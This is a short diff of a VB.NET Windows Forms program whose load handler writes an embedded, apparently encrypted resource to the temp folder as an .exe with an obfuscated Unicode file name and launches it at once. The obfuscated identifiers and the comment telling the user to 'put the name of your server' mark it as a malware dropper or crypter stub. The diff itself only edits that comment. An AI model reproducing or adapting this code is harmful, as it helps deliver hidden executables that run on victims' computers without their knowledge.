@@ -31,7 +31,7 @@ Public Class Form1
     End Sub
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Dim ඣ飯ꬡ໒ഞᘚ As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.exe" '  put the name of your server 
+        Dim ඣ飯ꬡ໒ഞᘚ As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.exe" '  put the name of your server AND CHANGE EXTENSION IF YOU NEED 
         Dim ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ As String = Path.GetTempPath  'the path for saving when launching form
         IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)
         Process.Start(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & ඣ飯ꬡ໒ഞᘚ)
